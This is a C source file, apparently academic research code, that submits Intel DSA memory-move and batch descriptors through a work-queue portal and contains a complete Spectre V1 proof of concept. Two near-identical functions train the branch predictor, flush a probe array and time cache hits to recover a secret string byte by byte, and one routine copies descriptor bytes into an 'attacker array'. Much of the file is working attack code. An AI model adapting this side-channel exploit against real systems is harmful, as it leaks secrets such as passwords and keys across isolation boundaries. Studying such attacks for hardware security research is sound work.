#include "DSASpectre.h"

int main(int argc, char *argv[]) {
    //uint8_t switchIndex;
    srand(time(NULL));

    // Parse program inputs and do initial checks...
    //detailedAssert((argc==4),"Main() - Not enough input arguments specified (./program bufferSize resfile mode).");
    //detailedAssert((atoi(argv[3])>=0 && atoi(argv[3])<NUM_MODES),"Main() - 'Mode' Num Invalid.");
    //mode = (modeEnum)atoi(argv[3]);
    bufferSize = (unsigned int)strtoul(argv[1], NULL, 10);
    //detailedAssert((bufferSize%64==0),"Main() - Please specify bufferSize that is a factor of 64, and <= 4096."); //  && bufferSize<=4096

    //profileCacheLatency();

    // Profile RDTSC latency overhead
    //profileRDTSC();

    // Spawn DSA checker thread...
    /*compRec.status=0;
    compilerMFence();
    spawnThreadOnDiffCore(&victimThread, victimThreadFn);
    spawnThreadOnSiblingCore(&checkerThread, checkerThreadFn);
    while(!threadStarted){
        spawnNOPs(1);
    }
    cpuMFence();*/

    //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
    //~~~~~~~~~~~~ BEGIN TESTS ~~~~~~~~~~~~//
    //TestSpectre();
    //single_DSADescriptorInit();
    //DSAMemMvSpectre();
    testDescr();
    //testPtr();

    // Output Results
    //printf("Test-Main1\n");
    //adjustTimes();
    //printf("Test-Main2\n");
    //parseResults(argv[2]);
    //printf("Test-Main3\n");

    return 0;

    // DEBUG ONLY
    //printf("\n%s", _headerStr_);
    //for(int i=0; i<NUM_TESTS; i++)
    //    printf("   %lu    ", resArr[i]);
    //printf("\n\n");

    //return 0;
}

void testDescr(){
    int fd;

    // WQ Path Check
    fd = open(wqPath, O_RDWR);
    detailedAssert((fd >= 0), "DSA Descriptor Init() failed opening WQ portal file from path.");

    descr.opcode = DSA_OPCODE_MEMMOVE;

    // Init srcDSA
    srcDSA = aligned_alloc(64, bufferSize);
    dstDSA = aligned_alloc(64, bufferSize);
    uint8_t *srcDSA2 = aligned_alloc(64, bufferSize);
    uint8_t *dstDSA2 = aligned_alloc(64, bufferSize);
    for(int i=0; i<bufferSize; i++)
    {
      srcDSA[i] = rand()%(255);
      srcDSA2[i] = rand()%(255);
    }
    // Set packet info
    /*descr.xfer_size = bufferSize;
    descr.flags = IDXD_OP_FLAG_RCR;
    descr.flags |= IDXD_OP_FLAG_CRAV;
    descr.src_addr  = (uintptr_t)srcDSA;
    descr.dst_addr  = (uintptr_t)dstDSA;
    descr.completion_addr = (uintptr_t)&compRec;

    printf("Descr base addr: %p\n", (void *)&descr);
    printf("Descr Opcode: %lu\n", descr.opcode);
    printf("Descr Xfer Size: %lu\n", descr.xfer_size);
    printf("Descr Src Addr: %lu (%x)\n", descr.src_addr, descr.src_addr);
    printf("Descr Dest Addr: %lu (%x)\n", descr.dst_addr, descr.dst_addr);
    printf("Descr Src Addr (actual): %p\n", (uintptr_t)srcDSA);
    printf("Descr Dest Addr (actual): %p\n", (uintptr_t)dstDSA);
    printf("Descr Src Addr Adjusted: | %lu| %lu| %lu| %lu| %lu| %lu| %lu| %lu|\n", (descr.src_addr & (255 << 7))>>7, 
        (descr.src_addr & (255 << 6))>>6, (descr.src_addr & (255 << 5))>>5, (descr.src_addr & (255 << 4))>>4, 
        (descr.src_addr & (255 << 3))>>3, (descr.src_addr & (255 << 2))>>2, (descr.src_addr & (255 << 1))>>1, 
        (descr.src_addr & (255)));
    printf("Descr Dst Addr Adjusted: | %lu| %lu| %lu| %lu| %lu| %lu| %lu| %lu|\n", (descr.dst_addr & (255 << 7))>>7, 
        (descr.dst_addr & (255 << 6))>>6, (descr.dst_addr & (255 << 5))>>5, (descr.dst_addr & (255 << 4))>>4, 
        (descr.dst_addr & (255 << 3))>>3, (descr.dst_addr & (255 << 2))>>2, (descr.dst_addr & (255 << 1))>>1, 
        (descr.dst_addr & (255)));
    printf("Descr CompRec Addr: %lu\n", descr.completion_addr);

    uint8_t *descByteArr = (uint8_t *)&descr;
    size_t len = sizeof(descr);
    
    printf("\nMem Mv Descriptor Byte Array: \n");
    for(int i=0; i<64; i+=8)
    {
        for(int j=7; j>=0; j--)
        {
            printf("%lu\t", descByteArr[i+j]);
        }
        printf("\n");
    }*/


    // Got batch to work with 13 descriptors, not 14 - dunno why
    // NEXT STEPS - USE SPECTRE

    // BATCH QUEUE TEST
    int numBatch=13;
    struct dsa_hw_desc *descrArr;
    descrArr = aligned_alloc(64, numBatch*64);
    //uint64_t descrAddrArr[64];

    for(int i=0; i<numBatch; i++)
    {
        descrArr[i].opcode = DSA_OPCODE_MEMMOVE;
        descrArr[i].src_addr  = (uintptr_t)srcDSA;
        descrArr[i].dst_addr  = (uintptr_t)dstDSA;
        descrArr[i].xfer_size = bufferSize;
        descrArr[i].flags = IDXD_OP_FLAG_CC;
        //descrArr[i].completion_addr = (uintptr_t)&compRec;

        //descrAddrArr[i] = (uintptr_t)&descrArr[i];
    }

    /*int8_t *descByteArr = (uint8_t *)&descrArr[0];
    size_t len = sizeof(descrArr[0]);
    
    printf("\nBatch Queue Descriptor Byte Array: \n");
    for(int i=0; i<64; i+=8)
    {
        for(int j=7; j>=0; j--)
        {
            printf("%lu\t", descByteArr[i+j]);
        }
        printf("\n");
    }

    descByteArr = (uint8_t *)&descrArr[1];
    len = sizeof(descrArr[1]);
    
    printf("\nBatch Queue Descriptor Byte Array: \n");
    for(int i=0; i<64; i+=8)
    {
        for(int j=7; j>=0; j--)
        {
            printf("%lu\t", descByteArr[i+j]);
        }
        printf("\n");
    }*/
    
    // Set packet info
    descr.opcode = DSA_OPCODE_BATCH;
    descr.flags = IDXD_OP_FLAG_RCR;
    descr.flags |= IDXD_OP_FLAG_CRAV;
    descr.xfer_size = numBatch;
    descr.src_addr  = (uintptr_t)descrArr;
    //descr.dst_addr  = (uintptr_t)dstDSA;
    descr.completion_addr = (uintptr_t)&compRec;

    printf("Descr base addr: %p\n", (void *)&descr);
    printf("Descr Opcode: %lu\n", descr.opcode);
    printf("Descr Xfer Size: %lu\n", descr.xfer_size);
    printf("Descr Src Addr: %lu (%x)\n", descr.src_addr, descr.src_addr);
    //printf("Descr Dest Addr: %lu (%x)\n", descr.dst_addr, descr.dst_addr);
    printf("Descr Src Addr (actual): %p\n", (uintptr_t)descrArr);
    //printf("Descr Dest Addr (actual): %p\n", (uintptr_t)dstDSA);
    
    uint8_t *srcByteArr = (uint8_t *)&descrArr;
    size_t srclen = sizeof(descrArr);
    printf("Descr Src Addr Adjusted: | %lu| %lu| %lu| %lu| %lu| %lu| %lu| %lu|\n", srcByteArr[7], srcByteArr[6], 
    srcByteArr[5], srcByteArr[4], srcByteArr[3], srcByteArr[2], srcByteArr[1], srcByteArr[0]);
    /*printf("Descr Dst Addr Adjusted: | %lu| %lu| %lu| %lu| %lu| %lu| %lu| %lu|\n", (descr.dst_addr & (255 << 7))>>7, 
        (descr.dst_addr & (255 << 6))>>6, (descr.dst_addr & (255 << 5))>>5, (descr.dst_addr & (255 << 4))>>4, 
        (descr.dst_addr & (255 << 3))>>3, (descr.dst_addr & (255 << 2))>>2, (descr.dst_addr & (255 << 1))>>1, 
        (descr.dst_addr & (255)));*/
    printf("Descr CompRec Addr: %lu\n", descr.completion_addr);

    uint8_t *descByteArr = (uint8_t *)&descr;
    uint8_t *testAttkArr = malloc(8);
    size_t len = sizeof(descr);
    
    printf("\nBatch Queue Descriptor Byte Array: \n");
    for(int i=0; i<64; i+=8)
    {
        for(int j=7; j>=0; j--)
        {
            printf("%lu\t", descByteArr[i+j]);

            if(i==16)
                testAttkArr[j] = descByteArr[i+j];
        }
        printf("\n");
    }
    
    printf("\nAttacker Array: \n");
    for(int j=7; j>=0; j--)
        printf("%lu\t", testAttkArr[j]);

    wq_portal = mmap(NULL, PORTAL_SIZE, PROT_WRITE, MAP_SHARED | MAP_POPULATE, fd, 0);
    detailedAssert(!(wq_portal == MAP_FAILED), "Descriptor Init() failed to map to portal.");
    close(fd);

    uint64_t killSwitch = 0;
    enqcmd(wq_portal, &descr);
    while(compRec.status != 1 && killSwitch < 10000000000){killSwitch++;}
    
    printf("\ncompRec.status = 0x%x - killSwitch = %lu\n", compRec.status, killSwitch);
}

void spectreDSABatch(){printf("\n|-- DSA Test Spectre V1 --|\n------------------\n");
    int i, j, k, randIndex, junk, runs=1000, runCount=0;
    bool breakLoop = false;
    volatile uint8_t *addr;
    uint64_t start, end;
    size_t attkAddr = (size_t)(spectreSecret - (char*)arr1);
    size_t randX, x;
    uint64_t startSpy = rdtsc();
    secretLen = strlen(spectreSecret);
    secretGuess = malloc(secretLen + 1);

    printf("Secret we are trying to discover using SpectreV1: '%s'\n", spectreSecret);

    // Init Arr2 with random, valid characters - then clflush everything
    initArr2AndFlush();
    
    printf("Running %d tests for each letter of secret code...", runs);

    // Iterate through secretLen, so we can see every character of password
    for(i=0; i<secretLen; i++){
        // Reset Guess Map to 0        
        for (int j=0; j<256; j++)
            guessMap[j] = 0;

        for(j=0; j<runs; j++)
        {
            breakLoop = false;
            // Flush out entire Arr2 from cache
            for (k=0; k<256; k++)
                flush(&arr2[k*512]);

            // Now train PHT, which we must do by flooding
            // gadget function with *mainly* valid data - so PHT assumes true...
            randX = rand()%(arr1Len);//tries % array1_size;
            for(k=0; k<30; k++)
            {
                flush(&arr1Len);
                for (int delay = 0; delay<100; delay++) {}

                // Set x to either safe index or attk index to manipulate PHT [4]
                x = ((k % 6) - 1) & ~0xFFFF;
                x = (x | (x >> 16));
                x = randX ^ (x & (attkAddr ^ randX));

                dummyReturnVar += spectreV1Gadget(x);
            }

            // Now, we can finally use our trained PHT to try and access secret, by
            // iterating over our arr2 and seeing which index has fastest hit time
            for(k=0; k<256; k++)
            {
                // Index needs to be shifted around to avoid stride prediction [4]
                randIndex = ((k * 167) + 13) & 255;
                addr = &arr2[randIndex * 512];
                start = __rdtscp(& junk);
                junk = * addr;
                end = __rdtscp(& junk);

                // Cache hit - mark index as likely number for secret letter
                if (end-start <= 80 && randIndex != arr1[runs%arr1Len])
                {
                    //printf("\tDebug [%d][%d] -- Guess = %c || (runs/50)=%d, guessMap[randIndex]=%d ||\n", i, j, randIndex, (runs/50), guessMap[randIndex]);
                    guessMap[randIndex]++;

                    // Early break condition -- it's definitely this char.
                    if(j>=(runs/50) && guessMap[randIndex]>(k/3))
                    {
                        runCount += j;
                        breakLoop = true;
                        break;
                    } 
                }
            }

            if(j==runs-1)
                runCount += runs;

            if(breakLoop)
                break;
        }

        k=0;
        // Grab the highest likely value, assign to current secret letter
        for(j=0; j<256; j++)
            k=(guessMap[j]>guessMap[k])? j:k;
        secretGuess[i] = (char)k;

        // Move on to the next letter in the secret
        attkAddr++;
    }

    printf("\t...done\nDiscovered Secret with Spectre: '%s'\n", secretGuess);
            
    if(strcmp(spectreSecret,secretGuess)==0)
        printf("\nSUCCESS: Discovered Secret Matches!\n");
    else
        printf("\nFAIL: Secret Mismatch!\n");

    printf("\t|--Elapsed Runtime for Spy--|\n\t Cycles =\t%ld\n\t Runs =\t\t%d\n", rdtsc()-startSpy, runCount);

    printf("------------------\n\n");
}

void TestSpectre(){
    printf("\n|-- DSA Test Spectre V1 --|\n------------------\n");
    int i, j, k, randIndex, junk, runs=1000, runCount=0;
    bool breakLoop = false;
    volatile uint8_t *addr;
    uint64_t start, end;
    size_t attkAddr = (size_t)(spectreSecret - (char*)arr1);
    size_t randX, x;
    uint64_t startSpy = rdtsc();
    secretLen = strlen(spectreSecret);
    secretGuess = malloc(secretLen + 1);

    printf("Secret we are trying to discover using SpectreV1: '%s'\n", spectreSecret);

    // Init Arr2 with random, valid characters - then clflush everything
    initArr2AndFlush();
    
    printf("Running %d tests for each letter of secret code...", runs);

    // Iterate through secretLen, so we can see every character of password
    for(i=0; i<secretLen; i++){
        // Reset Guess Map to 0        
        for (int j=0; j<256; j++)
            guessMap[j] = 0;

        for(j=0; j<runs; j++)
        {
            breakLoop = false;
            // Flush out entire Arr2 from cache
            for (k=0; k<256; k++)
                flush(&arr2[k*512]);

            // Now train PHT, which we must do by flooding
            // gadget function with *mainly* valid data - so PHT assumes true...
            randX = rand()%(arr1Len);//tries % array1_size;
            for(k=0; k<30; k++)
            {
                flush(&arr1Len);
                for (int delay = 0; delay<100; delay++) {}

                // Set x to either safe index or attk index to manipulate PHT [4]
                x = ((k % 6) - 1) & ~0xFFFF;
                x = (x | (x >> 16));
                x = randX ^ (x & (attkAddr ^ randX));

                dummyReturnVar += spectreV1Gadget(x);
            }

            // Now, we can finally use our trained PHT to try and access secret, by
            // iterating over our arr2 and seeing which index has fastest hit time
            for(k=0; k<256; k++)
            {
                // Index needs to be shifted around to avoid stride prediction [4]
                randIndex = ((k * 167) + 13) & 255;
                addr = &arr2[randIndex * 512];
                start = __rdtscp(& junk);
                junk = * addr;
                end = __rdtscp(& junk);

                // Cache hit - mark index as likely number for secret letter
                if (end-start <= 80 && randIndex != arr1[runs%arr1Len])
                {
                    //printf("\tDebug [%d][%d] -- Guess = %c || (runs/50)=%d, guessMap[randIndex]=%d ||\n", i, j, randIndex, (runs/50), guessMap[randIndex]);
                    guessMap[randIndex]++;

                    // Early break condition -- it's definitely this char.
                    if(j>=(runs/50) && guessMap[randIndex]>(k/3))
                    {
                        runCount += j;
                        breakLoop = true;
                        break;
                    } 
                }
            }

            if(j==runs-1)
                runCount += runs;

            if(breakLoop)
                break;
        }

        k=0;
        // Grab the highest likely value, assign to current secret letter
        for(j=0; j<256; j++)
            k=(guessMap[j]>guessMap[k])? j:k;
        secretGuess[i] = (char)k;

        // Move on to the next letter in the secret
        attkAddr++;
    }

    printf("\t...done\nDiscovered Secret with Spectre: '%s'\n", secretGuess);
            
    if(strcmp(spectreSecret,secretGuess)==0)
        printf("\nSUCCESS: Discovered Secret Matches!\n");
    else
        printf("\nFAIL: Secret Mismatch!\n");

    printf("\t|--Elapsed Runtime for Spy--|\n\t Cycles =\t%ld\n\t Runs =\t\t%d\n", rdtsc()-startSpy, runCount);

    printf("------------------\n\n");
}

// Spectre test fns..
void initArr2AndFlush(){
    int i;
    srand(time(0));

    // Fill with rand ints
    for(i=0; i<arr2Len; i++)
        arr2[i] = rand()%1000;

    // Flush Arr2 from cache, along with arr2Len
    for(i=0; i<arr2Len; i++)
        flush(&arr2[i]);

    flush(&arr2Len);
}

// Init DSA Descriptor Arr and Flush
void initDescrArrAndFlush(){
    int i;
    srand(time(0));

    // Fill with rand ints
    for(i=0; i<spectreDescrLen; i++)
        spectreDescr[i].opcode = rand()%255;

    // Flush Arr2 from cache, along with arr2Len
    for(i=0; i<spectreDescrLen; i++)
        flush(&spectreDescr[i]);

    flush(&spectreDescrLen);
}

uint8_t spectreV1Gadget(size_t x){
    if(x<arr1Len)
        return arr2[arr1[x] * 512];

    return 0;
}

// Use speculative execution to load our Descr
uint8_t spectreDSAGadget(size_t x){
    if(x<arr1Len)
        return arr2[arr1[x] * 512];

    return 0;
}